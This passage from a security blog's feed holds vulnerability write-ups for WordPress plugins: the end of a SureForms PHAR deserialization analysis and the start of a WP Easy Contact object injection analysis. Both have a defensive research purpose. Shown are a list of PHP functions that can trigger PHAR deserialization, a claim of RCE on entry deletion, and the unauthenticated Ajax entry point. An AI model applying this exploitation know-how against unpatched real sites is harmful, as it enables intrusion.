class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;------geckoformboundary951e0587d59c442ebcc7cae9dcac2221--&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;7&#34;&gt;&#xA;&lt;li&gt;When the admin deletes the entry&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-19-cve-2025-6742/result.png&#34; title=&#34;RCE when admin deletes entry&#34; data-thumbnail=&#34;/posts/2025-11-19-cve-2025-6742/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;RCE when admin deletes entry&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-19-cve-2025-6742/result.png&#39; alt=&#34;Result&#34; height=&#34;841&#34; width=&#34;1486&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;RCE when admin deletes entry&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;alert alert-warning&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M6.457 1.047c.659-1.234 2.427-1.234 3.086.0l6.082 11.378A1.75 1.75.0 0114.082 15H1.918A1.75 1.75.0 01.375 12.425zm1.763.707a.25.25.0 00-.44.0L1.698 13.132a.25.25.0 00.22.368h12.164a.25.25.0 00.22-.368zm.53 3.996v2.5a.75.75.0 01-1.5.0v-2.5a.75.75.0 011.5.0zM9 11a1 1 0 11-2 0 1 1 0 012 0z&#34;/&gt;&lt;/svg&gt;Warning&lt;/p&gt;&lt;p&gt;After testing multiple PHP versions, I found that: The function &lt;code&gt;file_exists()&lt;/code&gt; only works for PHAR exploitation on versions &lt;code&gt;&amp;lt;=7.4&lt;/code&gt;&lt;/p&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Some other functions usable for PHAR Deserialization exploitation:&lt;/strong&gt;&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;copy&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;file_exists&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;file_get_contents&amp;ensp;&amp;ensp;&amp;ensp;file_put_contents&amp;ensp;&amp;ensp;&amp;ensp;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;file&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;fileatime&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;filectime&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;filegroup&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;fileinode&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;filemtime&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;fileowner&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;fileperms&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;filesize&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;filetype&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;fopen&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;is_dir&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;is_executable&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;is_file&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;is_link&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;is_readable&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;is_writable&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;lstat&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;mkdir&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;parse_ini_file&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;readfile&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;rename&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;rmdir&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;stat&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;touch&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;unlink&amp;ensp;&amp;ensp;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h1 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h1&gt;&lt;p&gt;The &lt;strong&gt;PHP Object Injection vulnerability in SureForm &amp;lt;= 1.7.3&lt;/strong&gt; originates from using &lt;code&gt;file_exists()&lt;/code&gt; and &lt;code&gt;unlink()&lt;/code&gt; directly on a user-controlled path without scope constraints. Although the plugin does not contain a POP chain by default, if additional plugins or themes installed in the environment contain a POP chain, attackers may escalate exploitation to deleting files, reading sensitive data, or even executing arbitrary code (RCE). The 1.7.4 patch handles the issue by normalizing and restricting valid file paths into the upload directory, eliminating the exploitation vector.&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h1&gt;&lt;ul&gt;&#xA;&lt;li&gt;The vulnerability originates from interacting with filesystem paths derived directly from uncontrolled user input.&lt;/li&gt;&#xA;&lt;li&gt;Using only &lt;code&gt;file_exists()&lt;/code&gt; can lead to PHAR deserialization on PHP versions ≤7.4.&lt;/li&gt;&#xA;&lt;li&gt;Although the plugin has no built-in POP chain, typical WordPress environments host many plugins → high likelihood of chainability.&lt;/li&gt;&#xA;&lt;li&gt;The patch adds path normalization, upload directory restrictions, and avoids directly interacting with filesystem paths.&lt;/li&gt;&#xA;&lt;li&gt;File operation functions always pose exploitation risk if user inputs are not strongly validated.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Deserialization&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/sureforms/vulnerability/wordpress-sureforms-plugin-1-7-3-unauthenticated-php-object-injection-phar-vulnerability&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress SureForm Plugin &amp;lt;= 1.7.3 is vulnerable to a high priority PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-53572 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-11-18-cve-2025-53572/</link>
      <pubDate>Tue, 18 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-11-18-cve-2025-53572/</guid>
      <category domain="http://localhost:1313/categories/cve-analyst/">CVE Analyst</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-18-cve-2025-53572/app.jpg&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;Deserialization of Untrusted Data&lt;/strong&gt; vulnerability in &lt;strong&gt;emarket-design WP Easy Contact&lt;/strong&gt; allows &lt;strong&gt;Object Injection&lt;/strong&gt;.&#xA;This issue affects &lt;strong&gt;WP Easy Contact&lt;/strong&gt;: from &lt;em&gt;n/a&lt;/em&gt; to &lt;strong&gt;4.0.1&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-53572&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-53572&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: PHP Object Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 4.0.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 4.0.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (8.1)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/wp-easy-contact/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress WP Easy Contact Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version – WP Easy Contact&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;4.0.1&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;4.0.2&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability originates from allowing attackers to instantiate arbitrary objects from input → &lt;strong&gt;PHP Object Injection&lt;/strong&gt;.&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$widg_arr&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;explode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;-&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$div_id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$mywidg&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$widg_arr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]();&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The patch adds a whitelist and sanitizes the input → only valid classes can be instantiated, removing the vulnerability.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-18-cve-2025-53572/diff.png&#34; title=&#34;Changes in the patch&#34; data-thumbnail=&#34;/posts/2025-11-18-cve-2025-53572/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Changes in the patch&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-18-cve-2025-53572/diff.png&#39; alt=&#34;Diff&#34; height=&#34;766&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Changes in the patch&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers an Ajax action for unauthenticated users (&lt;code&gt;wp_ajax_nopriv&lt;/code&gt;):&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;add_action&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;wp_ajax_nopriv_emd_get_widg_pagenum&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;emd_get_widg_pagenum&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;When a request is sent to &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; with &lt;code&gt;action=emd_get_widg_pagenum&lt;/code&gt;, the callback &lt;code&gt;emd_get_widg_pagenum&lt;/code&gt; is executed:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;emd_get_widg_pagenum&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(){&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&lt;span class=&#34;nv&#34;&gt;$response&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span 